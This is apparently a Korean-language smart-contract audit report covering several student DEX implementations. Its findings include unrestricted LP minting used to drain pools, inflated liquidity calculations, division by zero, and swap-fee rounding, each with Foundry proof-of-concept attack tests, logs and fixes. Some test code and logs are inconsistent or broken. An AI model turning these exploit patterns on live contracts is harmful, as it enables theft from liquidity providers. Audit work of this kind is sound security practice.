Dex Protocol Audits
=====
# 무제한 유동성 토큰 발행으로 인한 자금 추출 취약성<br/>

File: Dex.sol <br/>
Function: transfer(address to, uint256 lpAmount) <br/>
Line Number: 159-167 <br/>

https://github.com/hangi-dreamer/Dex_solidity/blob/89a39ccd2d03346ae6ad8bfc1a35cf7a478f0593/src/Dex.sol#L159-L167
<br/>

## Description
Dex 컨트랙트의 전송 함수를 사용하면 누구나 유동성 토큰(LPT)을 발행하고 원하는 주소로 전송할 수 있습니다. 공격자는 이를 악용하여 대량의 LPT 토큰을 직접 발행한 다음, 이 토큰을 사용하여 removeLiquidity()를 호출하여 기본 토큰(TokenX 및 TokenY)을 추출할 수 있습니다.

**POC**
```solidity
function testMintLPBreak() external {
    // user add liquidity
    uint lp = dex.addLiquidity(3000 ether, 4000 ether, 0);
    emit log_named_uint("[user]LP", lp / 10**18);

    vm.startPrank(address(attacker));
    
    // attacker tokenX, tokenY balance
    uint tx = tokenX.balanceOf(address(attacker));
    uint ty = tokenY.balanceOf(address(attacker));
    emit log_named_uint("tokenX", tx / 10**18);
    emit log_named_uint("tokenY", ty / 10**18);

    dex.transfer((attacker), lp);

    dex.removeLiquidity(lp, 0, 0);

    // get token pair
    uint tx_attack = tokenX.balanceOf(address(attacker));
    uint ty_attack = tokenY.balanceOf(address(attacker));
    emit log_named_uint("tokenX", tx_attack / 10**18);
    emit log_named_uint("tokenY", ty_attack / 10**18);
}
```

## Impact
Severity: Critical <br/>
이 취약점을 통해 공격자는 LPT 토큰 공급량을 임의로 부풀리고 유동성 풀에서 기본 토큰을 추출할 수 있으며, 다른 유동성 공급자의 잠재적인 자금 손실을 초래할 수 있습니다.


## Mitigation
이 문제를 해결하려면 수정자 또는 접근 제어 메커니즘을 사용하여 승인된 당사자(예: 유동성 공급자)만 LPT 토큰을 발행할 수 있도록 제한하세요. 예를 들어, 승인된 minter의 매핑을 생성하고 호출자가 승인된 minter인지 확인한 후 채굴 작업을 허용하세요.


# 유동성 풀 예치를 통한 자금 비율 조작 취약성<br/>
File: Dex.sol <br/>
Function: transfer(address to, uint256 lpAmount) <br/>
Line Number: 161-164 <br/>

https://github.com/Gamj4tang/Audit/blob/013f20956df837cb38afc947e1d1363d6fa695f6/src/Dex.sol#L161-L164<br/>

## Description
이 기능을 통해 사용자는 유동성 풀 토큰을 다른 주소로 전송할 수 있습니다. 그러나 이 전송 함수에는 어떠한 검사나 검증도 포함되어 있지 않아 공격자가 악의적인 방식으로 이 기능을 사용할 경우 가격 조작으로 이어질 수 있습니다.

## Impact
Severity: Critical <br/>
이 취약점으로 인해 공격자는 대량의 토큰을 예치한 다음 유동성 풀 토큰을 다른 주소로 전송하여 유동성 풀 내 토큰 가격을 조작할 수 있습니다. 이는 인위적인 가격 변동으로 이어져 다른 사용자에게 금전적 손실을 초래하고 잠재적으로 유동성 풀을 불안정하게 만들 수 있습니다.

## Mitigation
이 취약점을 완화하려면 전송 함수에 검사 및 유효성 검사를 포함하도록 업데이트해야 합니다., 실수로 토큰이 소각되는 것을 방지하기 위해 _to 주소가 제로 주소가 아닌지 확인합니다, 한 번에 전송할 수 있는 토큰 수를 제한하거나 전송 사이에 시간 제한을 도입하는 메커니즘을 구현하여 빠른 가격 조작을 방지합니다, 전송이 완료된 후 이벤트를 발생시켜 전송의 투명성과 추적성을 제공합니다.
또한, 토큰 컨트랙트로 작업할 때 흔히 발생할 수 있는 함정을 방지하는 검사 및 유효성 검사 로직이 필요합니다.


# 잘못된 유동성 공급 계산으로 인한 자금 탈취<br/>

File: Dex.sol <br/>
Function: function swap(
        uint256 tokenXAmount,
        uint256 tokenYAmount,
        uint256 tokenMinimumOutputAmount
    ) external returns (uint256 outputAmount)
Line Number: 37-72 <br/>
https://github.com/seonghwi-lee/Lending-DEX_solidity/blob/530bc429f200975439e44a0ffd21d689a6052212/src/Dex.sol#L37-L72

<br/>

## Description
현재 구현된 addLiquidity 함수에서 유동성 토큰 발행 계산이 잘못되어 있어,
유동성 공급에 따른 반환 값이 고정적이지 않고 계속 증가하는 문제가 발생하고 있습니다. 이는 liquidity 변수의 계산식이 올바르지 않기 때문입니다

**POC**
```solidity
function testAddAddAdd() external {
    // attacker token transfer
    tokenX.transfer(address(attacker), 10000 ether);
    tokenY.transfer(address(attacker), 10000 ether);
    // attacker => addliquidity call
    vm.startPrank(attacker);
    tokenX.approve(address(dex), ~uint256(0));
    tokenY.approve(address(dex), ~uint256(0));

    for (uint i = 0; i < 20; i++) {
        uint lp = dex.addLiquidity(
            500 ether,
            500 ether,
            0
        );
        // lp token change
        emit log_named_uint("LP", lp);
    }
    // token statking
}
Logs:
  LP: 500000000000000000000
  LP: 500000000000000000000
  LP: 1000000000000000000000
  LP: 3000000000000000000000
  LP: 12000000000000000000000
  LP: 60000000000000000000000
  LP: 360000000000000000000000
  LP: 2520000000000000000000000
  LP: 20160000000000000000000000
  LP: 181440000000000000000000000
  LP: 1814400000000000000000000000
  LP: 19958400000000000000000000000
  LP: 239500800000000000000000000000
  LP: 3113510400000000000000000000000
  LP: 43589145600000000000000000000000
  LP: 653837184000000000000000000000000
  LP: 10461394944000000000000000000000000
  LP: 177843714048000000000000000000000000
  LP: 3201186852864000000000000000000000000
  LP: 60822550204416000000000000000000000000
```

## Impact
Severity: Critical <br/>
유동성 공급량에 대한 비율이 증가 됨에 따라, 서로 상호 연관되는 함수들의 수수료가 증가하게 되고, 이는 공격자에게 유리한 환경을 만들어 줍니다.

## Mitigation
문제가 되는 부분은 addLiquidity 함수에서 유동성 토큰 발행을 계산하는 부분입니다.
함수 내부의 liquidity 변수가 올바르게 계산되지 않고 있어 반환되는 값이 고정적이지 않고 계속 증가하고 있습니다. 

현재 liquidity 계산식은 아래와 같습니다.
```solidity
liquidity = sqrt(optToken * tokenYAmount);
```
여기서 문제는 optToken이나 tokenYAmount, tokenXAmount의 곱으로 발행할 유동성 토큰을 계산하고 있기 때문입니다. 아래와 같이 변경을 해줘야 합니다.
```solidity
liquidity = min(tokenXAmount * totalSupply / reservedX, tokenYAmount * totalSupply / reservedY);
```
```solidity
if (optToken > curY) {
    tokenX.transferFrom(msg.sender, address(this), optToken);
    tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
    liquidity = min(optToken * totalSupply() / reservedX, tokenYAmount * totalSupply() / reservedY);
} else {
    tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    tokenY.transferFrom(msg.sender, address(this), optToken);
    liquidity = min(tokenXAmount * totalSupply() / reservedX, optToken * totalSupply() / reservedY);
}
```

# 유동성 공급 분기 처리 미흡으로 인한 토큰 페어 0 나눗셈 오류
File: Dex.sol <br/>                                                        
Function: function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) <br/>
Line Number: 36-47 <br/>
https://github.com/siwon-huh/DEX_solidity/blob/257b4d898b70453905cdf1bec7da7418011f941f/src/Dex.sol#L36-L47
<br/>
## Description
초기 유동성 공급이 성공적으로 수행되면 글로벌 상태 변수 first_lp가 거짓으로 설정되어 유동성 공급 분기를 나누는 종속 변수가 트리거됩니다. 그러나 유동성을 성공적으로 초기화한 후 유동성을 제거하여 기존 토큰 쌍 풀을 0으로 만든 다음 다시 유동성을 추가하면 초기 토큰 쌍의 잔액은 0으로 수렴합니다. 글로벌 상태 변수 first_lp가 거짓으로 할당되므로 함수는 초기 유동성 제공 로직 대신 유동성 유지 로직에 진입합니다. 이 경우 기존 준비 토큰 쌍의 잔액을 참조하여 0으로 나누기 때문에 0 나누기 오류가 발생합니다.


```solidity
function testLpTokenImbalance() external {
    tokenX.transfer(address(attacker), (~uint256(0))/2);
    tokenY.transfer(address(attacker), (~uint256(0))/2);

    vm.startPrank(attacker2);
    tokenX.approve(address(dex), ~uint256(0));
    tokenY.approve(address(dex), ~uint256(0));
    vm.stopPrank();

    vm.startPrank(attacker);
    tokenX.approve(address(dex), ~uint256(0));
    tokenY.approve(address(dex), ~uint256(0));
    vm.stopPrank();

    // token add liquidity
    for (uint i = 0; i < 271; i++) {
        vm.startPrank(attacker);
        uint256 lp = dex.addLiquidity(12345 ether, 12345 ether, 0);
        uint _tx_balance_re = tokenX.balanceOf(address(attacker));
        uint _ty_balance_re = tokenY.balanceOf(address(attacker));
        emit log_named_decimal_uint("tokenX_add_remove", _tx_balance_re, 18);
        emit log_named_decimal_uint("tokenY_add_remove", _ty_balance_re, 18);
        emit log_named_uint("LP", lp);
        emit log_named_uint("Count:", i);


        dex.removeLiquidity(lp, 0, 0);

        vm.stopPrank();
        // uint _tx_balance_re = tokenX.balanceOf(address(attacker));
        // uint _ty_balance_re = tokenY.balanceOf(address(attacker));
        // emit log_named_decimal_uint("tokenX_add_remove", _tx_balance_re, 18);
        // emit log_named_decimal_uint("tokenY_add_remove", _ty_balance_re, 18);
        vm.startPrank(attacker2);
        // tokenX.transfer(address(dex), 1 ether);
        // tokenY.transfer(address(dex), 1 ether);
        // tokenY.transfer(address(dex), 127 ether);
        vm.stopPrank();
    }
[FAIL. Reason: Division or modulo by 0] testLpTokenImbalance() (gas: 360354)
Logs:
  tokenX_add_remove: 57896044618658097711785492504343953926634992332820282008383.792003956564819967
  tokenY_add_remove: 57896044618658097711785492504343953926634992332820282008383.792003956564819967
  LP: 12345000000000
  Count:: 0
  [remove] tokenX_in_LP: 12345000000000000000000
  [remove] tokenY_in_LP: 12345000000000000000000
  [remove] totalSupply: 12345000000000
  [remove] LPTokenAmount: 12345000000000
  [remove] minimumTokenXAmount: 0
  [remove] minimumTokenYAmount: 0
  [add] tokenX_in_LP: 0
  [add] tokenY_in_LP: 0
  [add] tokenXAmount: 12345000000000000000000
  [add] tokenYAmount: 12345000000000000000000
  [add] totalSupply: 0

```
## Impact
Severity: Critical <br/>
0 나누기 오류로 인해 계약이 실패하거나 예기치 않은 동작이 발생하여 잠재적으로 자금 손실이나 기타 의도하지 않은 결과를 초래할 수 있습니다.
컨트랙트 실패: 이 오류로 인해 계약이 되돌리거나 실패하여 문제가 해결될 때까지 사용할 수 없게 될 수 있습니다.
자금 손실: 사용자는 잘못된 토큰 잔액 또는 유동성 풀 비율로 인해 자금을 잃을 수 있으며, 이는 금전적 손실과 계약의 평판 손상으로 이어질 수 있습니다.
조작: 공격자는 취약점을 악용하여 컨트랙트의 상태를 조작하거나 기타 악의적인 행동을 수행하여 추가 피해를 유발할 수 있습니다.

## Mitigation
문제를 완화하려면 컨트랙트가 0으로 나누려고 시도하지 않는지 확인하는 검사를 추가할 수 있습니다. 또한 브랜치 처리 로직을 업데이트하여 초기 유동성 공급 로직 또는 유동성 유지 로직을 사용할 시점을 정확하게 식별할 수 있습니다.

예를 들어 토큰 보유량이 0인지 확인하는 조건을 추가하고 유동성 공급 프로세스를 다시 초기화할 수 있습니다:
```solidity
if (tokenX_in_LP == 0 && tokenY_in_LP == 0) {
    // Reinitialize the liquidity provision process
    first_LP = true;
}
```
그런 다음 토큰 보유량이 0인 시나리오를 포함하도록 테스트를 업데이트하여 업데이트된 로직이 예상대로 작동하는지 확인합니다.


# 잘못된 유동성 공급 계산으로 인한 자금 동결<br/>
File: Dex.sol <br/>
Function: function swap(
        uint256 tokenXAmount,
        uint256 tokenYAmount,
        uint256 tokenMinimumOutputAmount
    ) external returns (uint256 outputAmount) <br/>
Line Number: 109-136 <br/>

https://github.com/hangi-dreamer/Dex_solidity/blob/89a39ccd2d03346ae6ad8bfc1a35cf7a478f0593/src/Dex.sol#L106

## Description
유동성 공급시 아래와 같은 수식을 사용해 유동성 공급 로직을 수행합니다. priceOfX, Y 가격은 커스텀 오라클에서 값을 가져오고 balance 는 기존의 토큰 페어의 밸런스를 참조합니다. 
```solidity
LPTokenAmount = Math.sqrt((priceOfX * (balanceOfX + tokenXAmount)) * (priceOfY * (balanceOfY + tokenYAmount)), Math.Rounding.Up);
```
최초 유동성 공급 과정에서 토큰 유동성 비율에 맞는 값을 구한 후 제곱근의 결과를 반올림 하는 과정에서 실제 비례 지분보다 약간 더 많은 LP 토큰을 할당할 수 있고, 이런 불균형으로 인해서 거래에 대한 비율이 커진다. 유동성 공급을 위해 작은 단위의 소수점을 할당했을 경우, 사용자 자금을 지불 하지만, 프로토콜 측에서 비율상 유동성 토큰을 발급하지 못하고, 실패 하게 되어 자금이 동결 될 수 있습니다.


```solidity
function testBurnZer0() external {
    tokenX.transfer(address(attacker), 1000 ether);
    tokenY.transfer(address(attacker), 1000 ether);

    vm.startPrank(attacker);
    tokenX.approve(address(dex), ~uint256(0));
    tokenY.approve(address(dex), ~uint256(0));
    
    dex.addLiquidity(0.1 ether, 0.1 ether, 0);
    emit log_named_uint("LP", lp);
    // emit log_named_decimal_uint("lp=>", lp, 18);

    uint _tx_balance = tokenX.balanceOf(address(attacker));
    uint _ty_balance = tokenY.balanceOf(address(attacker));
    emit log_named_decimal_uint("tokenX", _tx_balance, 18);
    emit log_named_decimal_uint("tokenY", _ty_balance, 18);

    dex.removeLiquidity(0.001 ether, 0, 0);

    uint _tx_balance_re = tokenX.balanceOf(address(attacker));
    uint _ty_balance_re = tokenY.balanceOf(address(attacker));
    emit log_named_decimal_uint("tokenX_add_remove", _tx_balance_re, 18);
    emit log_named_decimal_uint("tokenY_add_remove", _ty_balance_re, 18);
    
}
Running 1 test for test/DEX.t.sol:DexTest
[FAIL. Reason: EvmError: Revert] testBurnZer0() (gas: 201665)
Logs:
  LPTokenAmount: 0
  LP: 0
  tokenX: 1999.900000000000000000
  tokenY: 1999.900000000000000000

Test result: FAILED. 0 passed; 1 failed; finished in 1.52ms

Failing tests:
Encountered 1 failing test in test/DEX.t.sol:DexTest
[FAIL. Reason: EvmError: Revert] testBurnZer0() (gas: 201665)

```

## Impact
Severity: Medium <br/>
유동성 공급 과정에서 사용자들의 토큰이 비율 오류로 인해 자금이 프로토콜 상에 동결되어 러그 풀이 될 가능성이 높으며 이로 인해 신뢰도가 하락할 수 있습니다. 


## Mitigation
제곱근 연산 후 반올림과 함께 유동성 토큰 가격 계산에 부정확성을 초래할 수 있고 이로 인해 시간이 지남에 따라 전체 유동성에 누적되어 풀 비율에 영향을 줄 수 있습니다. 차익이 발생하지 않는 범위 내에서 유동성 비율 계산을 진행하고 이에 대한 업데이트 과정을 진행해야 합니다.


# 유동성 토큰 페어 스왑 내 프로토콜 수수료 잘못된 계산 취약성<br/>
File: Dex.sol <br/>
Function: function swap(
        uint256 tokenXAmount,
        uint256 tokenYAmount,
        uint256 tokenMinimumOutputAmount
    ) external returns (uint256 outputAmount) <br/>
Line Number: 109-136 <br/>

https://github.com/hangi-dreamer/Dex_solidity/blob/89a39ccd2d03346ae6ad8bfc1a35cf7a478f0593/src/Dex.sol#L109-L136

swap 함수에서는 수수료가 0이 되는 경우를 고려하지 않았습니다. 이 함수에서 수수료를 계산하는 부분은 아래와 같습니다.
TokenX를 TokenY로 교환하는 경우:
```solidity
outputAmount = (balanceOfY - (K / (balanceOfX + tokenXAmount))) * 999 / 1000;
```
TokenY를 TokenX로 교환하는 경우
```solidity
outputAmount = (balanceOfX - (K / (balanceOfY + tokenYAmount))) * 999 / 1000;
```
각 경우에서 수수료는 `* 999 / 1000` 부분을 통해 계산되며, 이는 실제 거래 금액의 0.1%를 나타냅니다. 그러나 이렇게 계산하면 토큰 금액이 1000으로 나누어 떨어지지 않을 때 수수료가 올바르게 계산되지 않을 수 있습니다.

## Impact
Severity: Low <br/>
해당 취약성은 토큰 금액이 999인 경우, 수수료는 0.999가 되어야 하지만 999 * 999 / 1000을 계산하면 0이 됩니다. 이로 인해 거래자가 수수료를 내지 않고 토큰을 교환할 수 있어, 연속 거래를 통해 공격자가 토큰을 무료로 교환할 수 있습니다. 이로 인해 공격자는 토큰을 무료로 교환하고 유동성 공급자의 자금을 훔칠 수 있습니다.
### POC
```solidity
function testSwapFeeZer0() public {
    vm.startPrank(attacker);
    tokenX.approve(address(dex), 100 ether);
    tokenY.approve(address(dex), 100 ether);
    uint256 lp = dex.addLiquidity(100 ether, 100 ether, 0);
    uint lpFee = 100 ether + 999 * 1000;
    vm.stopPrank();

    vm.startPrank(attacker2);
    tokenX.approve(address(dex), 100 ether);
    for (uint i = 0; i < 1000; i++) {
        dex.swap(999, 0, 0);
    }    
    vm.stopPrank();

    vm.startPrank(attacker);
    uint256 balanceBefore = tokenX.balanceOf(attacker);
    dex.removeLiquidity(lp, 0, 0);
    uint256 balanceAfter = tokenX.balanceOf(attacker);
    emit log_named_uint("balanceBefore", balanceBefore);
    emit log_named_uint("balanceAfter", balanceAfter);

    assertGt(balanceAfter - balanceBefore, lpFee);
}
```
```
[FAIL. Reason: Assertion failed.] testSwapFeeZer0() (gas: 14033412)
Logs:
  balanceBefore: 900000000000000000000
  balanceAfter: 900000000000000000000
  Error: a > b not satisfied [uint]
    Value a: 0
    Value b: 100000000000000999000

Test result: FAILED. 0 passed; 1 failed; finished in 32.18ms

Failing tests:
Encountered 1 failing test in test/DEX.t.sol:DexTest
[FAIL. Reason: Assertion failed.] testSwapFeeZer0() (gas: 14033412)
```

## Mitigation
이 문제를 해결하려면 다음과 같이 수수료 계산 방식을 변경해야 합니다.
TokenX를 TokenY로 교환하는 경우:
```solidity
outputAmount = (balanceOfY - (K / (balanceOfX + tokenXAmount))) * (1000 - feeRate) / 1000;
```
TokenY를 TokenX로 교환하는 경우:
```solidity
outputAmount = (balanceOfX - (K / (balanceOfY + tokenYAmount))) * (1000 - feeRate) / 1000;
```
여기서 feeRate는 수수료 비율을 나타내는 변수로, 이 경우 1 (0.1%)로 설정할 수 있습니다. 이렇게 하면 토큰 금액이 1000으로 나누어 떨어지지 않아도 올바른 수수료가 적용됩니다.
# 유동성 공급시 토큰 페어및 유동성 토큰의 잔액 불일치<br/>

File: Dex.sol <br/>                                                        
Function: function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) <br/>
Line Number: 46-75 <br/>
https://github.com/dlanaraa/DEX_solidity/blob/766dc1dca3cc92362959044d9555800fca5c153e/src/dex.sol#L88-L98

## Description
유동성 공급 과정에서 처음 유동성 풀을 생성한 후 기존의 존재하던 리저브 토큰의 가격 정보와 새롭게 등록될 유동성 토큰 페어에 가격 매칭 검사가 부족하기에 현재 구현된 스마트 컨트랙트에서는 addLiquidity 함수를 호출할 때 토큰 A와 토큰 B의 공급 비율에 대한 검증이 이루어지지 않습니다. 따라서 사용자가 원하는 비율과 다른 비율로 유동성을 추가할 수 있으며, 이로 인해 토큰 페어 및 유동성 토큰의 잔액에 불일치가 발생할 수 있습니다. 이러한 불일치는 유동성 공급자들에게 예상치 못한 손실을 가져올 수 있습니다. 예를 들어, 공급자가 비율에 따라 발행되어야 하는 LP 토큰보다 적은 양의 LP 토큰을 받게 될 수 있으며, 유동성 제거 시 원래 공급한 토큰보다 적은 양의 토큰을 회수할 수 있습니다. 예를 들어, 토큰 A와 토큰 B의 가격이 크게 변동하는 경우, 토큰의 비율 불일치로 인해 거래소의 유동성이 소진되거나 토큰 가격에 큰 변동이 발생할 수 있습니다.

```solidity
function testLpTokenImbalance() external {
    tokenX.transfer(address(attacker), (~uint256(0))/2);
    tokenY.transfer(address(attacker), (~uint256(0))/2);

    vm.startPrank(attacker2);
    tokenX.approve(address(dex), ~uint256(0));
    tokenY.approve(address(dex), ~uint256(0));
    vm.stopPrank();

    vm.startPrank(attacker);
    tokenX.approve(address(dex), ~uint256(0));
    tokenY.approve(address(dex), ~uint256(0));
    vm.stopPrank();

    // token add liquidity
    for (uint i = 0; i < 271; i++) {
        vm.startPrank(attacker);
        uint256 lp = dex.addLiquidity(12345 ether, 12345 ether, 0);
        uint _tx_balance_re = tokenX.balanceOf(address(attacker));
        uint _ty_balance_re = tokenY.balanceOf(address(attacker));

        tokenX.transfer(address(dex), 1 ether););
        vm.stopPrank();
    }
}

...
  Count:: 268
  tokenX_add_remove: 57896044618658097711785492504343953926634992332820278687578.792003956564819967
  tokenY_add_remove: 57896044618658097711785492504343953926634992332820278687578.792003956564819967
  LP: 152322834033484717502102698272844590451520413
  Count:: 269
  tokenX_add_remove: 57896044618658097711785492504343953926634992332820278675233.792003956564819967
  tokenY_add_remove: 57896044618658097711785492504343953926634992332820278675233.792003956564819967
  LP: 152322788337822594671881033405321664194225968
  Count:: 270

```

## Impact
Severity: Medium <br/>
이 취약점으로 인해 유동성 공급 과정에서 가격 불일치가 발생할 수 있습니다. 이로 인해 토큰 가격에 왜곡이 발생하고, 이를 이용한 공격자가 이익을 얻을 수 있습니다. 또한 이로 인해 신뢰성과 안정성이 떨어질 수 있으며, 이에 따라 사용자들의 거래 활동이 감소할 수 있습니다.

## Mitiagation
유동성 공급 과정에서 가격 매칭 검사를 강화합니다. 기존 리저브 토큰의 가격 정보와 새로운 유동성 토큰 페어의 가격이 일치하는지 확인하는 로직을 추가합니다. 유동성 공급자에게 보다 안전한 환경을 제공하기 위해, 거래소의 가격 오라클을 이용하여 실시간 가격 정보를 기반으로 한 유동성 공급 검증 절차를 도입합니다. 컨트랙트 이벤트를 트리거해 유동성 공급 및 제거 과정에서 발생하는 토큰 가격 변화와 관련된 정보를 실시간으로 모니터링할 수 있도록 합니다.

# 유동성 적은 금액 기반 스왑 수수료 손실<br/>

File: Dex.sol <br/>
Function: function swap(
        uint256 tokenXAmount,
        uint256 tokenYAmount,
        uint256 tokenMinimumOutputAmount
    ) external returns (uint256 outputAmount)
Line Number: 26-69 <br/>
https://github.com/dlanaraa/DEX_solidity/blob/766dc1dca3cc92362959044d9555800fca5c153e/src/dex.sol#L26-L69
<br/>

## Description
Solidity에서 나눗셈은 기본적으로 내림을 사용합니다. 이렇게 하면 여러 작업에서 누적되는 오차가 생길 수 있습니다 그러나 이 경우에는 999를 곱한 다음 1000으로 나누는 방식으로 수수료를 계산하고 있으므로,수수료 오차가 최소화됩니다. 하지만, 
적은 금액에 대한 스왑 시 발생하는 0.1% 수수료 손실에 대한 소수점 이슈로 인한 수수료 계산의 정확성 문제를 확인할 수 있습니다. 특히 수수료 계산을 할 때 소수점 이하 값들이 손실되는 경우가 있음 작은 금액의 거래에서 소수점 이하 값의 손실이 큰 영향을 미치지 않지만, 이로 인한 수수료 계산의 정확성이 떨어질 수 있습니다.

swap 함수에서 거래를 수행할 때, 0.1%의 수수료가 적용됩니다. input_amount의 999/1000을 사용하여 수수료를 적용하면 소수점 이하 값이 손실될 수 있습니다.


**POC**
```solidity
function testSwapLogicCalc() external {
    uint _lp = dex.addLiquidity(1000 ether, 1000 ether, 0);
    
    tokenX.transfer(address(attacker),(3000 ether + 30000 ether * 10));
    tokenY.transfer(address(attacker),(3000 ether + 30000 ether * 10));

    
    vm.startPrank(address(attacker));
    tokenX.approve(address(dex), type(uint).max);
    tokenY.approve(address(dex), type(uint).max);


    tokenX.transfer(address(dex), (1000 ether));
    uint y_Swap_x;
    for (uint i = 0; i < 100; i++) {
        y_Swap_x += dex.swap(
            0,
            1000 ether,
            0
        );
        
    }
    vm.stopPrank();
    uint lpFee = 1000 ether + 999 * 1000;
    emit log_named_uint("y_Swap_x", y_Swap_x);
    emit log_named_uint("lpFee", lpFee);

    dex.removeLiquidity(_lp, 0, 0);



    uint _tx_balance = tokenX.balanceOf(address(dex));
    uint _ty_balance = tokenY.balanceOf(address(dex));
    emit log_named_uint("tokenX", _tx_balance);
    emit log_named_uint("tokenY", _ty_balance);
}
Logs:
  lp: 10000000000000000000000000000000000000000
  lp: 10000000000000000000000.000000000000000000
  lp: 10000000000000000000000000000000000000000
  lp: 10000000000000000000000.000000000000000000
  lp: 10000000000000000000000000000000000000000
  lp: 10000000000000000000000.000000000000000000
  lp: 10000000000000000000000000000000000000000
  lp: 10000000000000000000000.000000000000000000
  lp: 10000000000000000000000000000000000000000
  lp: 10000000000000000000000.000000000000000000
  lp: 10000000000000000000000000000000000000000
  lp: 10000000000000000000000.000000000000000000
  lp: 10000000000000000000000000000000000000000
  lp: 10000000000000000000000.000000000000000000
  lp: 10000000000000000000000000000000000000000
  lp: 10000000000000000000000.000000000000000000
  lp: 10000000000000000000000000000000000000000
  lp: 10000000000000000000000.000000000000000000
  lp: 10000000000000000000000000000000000000000
  lp: 10000000000000000000000.000000000000000000
  balanceBefore: 0
  balanceAfter: 100000000000000099900
  diff: 100000000000000099900
  Error: a > b not satisfied [uint]
    Value a: 100000000000000099900
    Value b: 100000000000000999000
```

## Impact
Severity: Low <br/>
소수점 이하 값의 손실이 발생할 경우, 수수료 계산의 정확성이 떨어지고, 적은 금액의 거래에서는 이러한 소수점 이하 값의 손실이 큰 영향을 미치지 않으나, 누적될시 큰 여향을 미칠 가능성이 높으며 이로 인해 프로토콜의 신뢰도 하락 및 자금 손실이 유발 될 수 있습니다.

## Mitigation
고정 소수점 산술을 사용하여 소수점 이하 자릿수를 유지하고 더 정확한 수수료 계산을 수행할 수 았습니다. SafeMath 라이브러리를 사용하여 오버플로우와 언더플로우 문제를 해결하고, 정확한 계산을 수행 하는 것이 중요합니다. 



# 유동성 제거시 필요한 검증 미흡
File: Dex.sol <br/>                                                        
Function: function removeLiquidity(uint256 LPTokenAmount, uint256 minimumTokenXAmount, uint256 minimumTokenYAmount) <br/>
Line Number: 116-136 <br/>
https://github.com/dlanaraa/DEX_solidity/blob/766dc1dca3cc92362959044d9555800fca5c153e/src/dex.sol#L116-L136<br/>

## Description
removeLiquidity 함수에서 필요한 검증들이 주석처리 되어 있거나 누락되어 있습니다. 이로 인해 유동성 제거 과정에서 예기치 않은 문제가 발생할 수 있습니다.
## Impact
Security: Low<br/>
이 취약점으로 인해 악의적인 사용자가 이를 악용하여 유동성 제거 과정에서 다른 사용자의 자금에 손해를 입힐 수 있습니다. 또한 이로 인해 거래소의 신뢰성과 안정성이 떨어질 수 있습니다.
## Mitigation

 주석 처리된 검증을 활성화하고, 필요한 추가 검증을 구현합니다. 예를 들어, LPTokenAmount가 0보다 큰지 확인하고, msg.sender의 LPToken 잔액이 충분하지 확인해야 합니다. 
```solidity
require(LPTokenAmount > 0, "less LPToken");
require(balanceOf(msg.sender) >= LPTokenAmount, "less LPToken");
```
추가적인 검증을 구현하여 거래의 안전성을 높입니다. 예를 들어, 유동성 제거 시 사용자가 제거하려는 토큰의 비율이 허용 범위 내에 있는지 확인할 수 있습니다.


# 유동성 공급 실패시 트랜잭션 복구 불가능한 취약성<br/>
File: Dex.sol <br/>
Function: function addLiquidity(
        uint256 tokenXAmount,
        uint256 tokenYAmount,
        uint256 minimumLPTokenAmount
    ) <br/>
Line Number: 106 <br/>

https://github.com/hangi-dreamer/Dex_solidity/blob/89a39ccd2d03346ae6ad8bfc1a35cf7a478f0593/src/Dex.sol#L106


'swap' 함수는 사용자가 특정 토큰 쌍 간의 교환을 수행할 때 사용된다. 현재 구현에서는 유동성 공급이 실패할 경우 트랜잭션 복구가 불가능한 취약성이 존재한다.

장점: 가스 비용 최적화 및 함수 호출 실패 시 전체 트랜잭션 되돌리지 않음.
단점: 함수 호출 실패 시 전체 트랜잭션이 되돌리지 않아 부작용 발생 가능.
권장되지 않는 패턴에 대한 논의
주어진 코드에서 사용된 address(this).call 방식은 일반적으로 권장되지 않는 패턴이다. 이 방식으로 인해 함수 호출 실패 시 전체 트랜잭션을 되돌리지 않아 부작용이 발생할 수 있다. 따라서 안전한 방식으로 transfer 함수를 직접 호출하는 것이 좋다.


## Impact
Severity: Low <br/>
유동성 공급 실패 시 트랜잭션 복구가 불가능한 이유는 함수 호출 실패 시 전체 트랜잭션을 되돌리지 않기 때문이다. 이로 인해 사용자는 의도하지 않은 결과를 받게 되며, 이는 결국 사용자의 자금 손실로 이어질 수 있다.

## Mitigation
유동성 공급 실패 시 트랜잭션 복구가 불가능한 이유는 함수 호출 실패 시 전체 트랜잭션을 되돌리지 않기 때문이다. 이로 인해 사용자는 의도하지 않은 결과를 받게 되며, 이는 결국 사용자의 자금 손실로 이어질 수 있다.


함수 호출 실패 시 전체 트랜잭션을 되돌릴 수 있도록 구현을 수정한다. 이를 위해 'require' 문을 사용하여 함수 호출 조건을 체크하고, 만족하지 않는 경우 트랜잭션을 되돌린다.
안전한 함수 호출 방식을 사용한다. 예를 들어, transfer 함수를 직접 호출하거나 다른 안전한 방식을 사용하여 트랜잭션의 안전성을 보장한다.

```solidity
function swap(
    uint256 tokenXAmount,
    uint256 tokenYAmount,
    uint256 tokenMinimumOutputAmount
) external returns (uint256 outputAmount) {
    // ... 기존 코드 ...

    require(outputAmount >= tokenMinimumOutputAmount, "Output amount is less than the minimum required");

    // 안전한 transfer 호출
    IERC20(_tokenX).transferFrom(msg.sender, address(this), tokenXAmount);
    IERC20(_tokenY).transfer(msg.sender, outputAmount);

    // ... 기존 코드 ...
}
```
Dex.sol 파일의 'swap' 함수에서 발견된 유동성 공급 실패 시 트랜잭션 복구 불가능한 취약성을 대응하기 위해, 함수 호출 실패 시 전체 트랜잭션을 되돌릴 수 있도록 수정하고 안전한 함수 호출 방식을 사용하는 것이 필요하다. 이를 통해 사용자의 자금 손실 위험을 최소화할 수 있다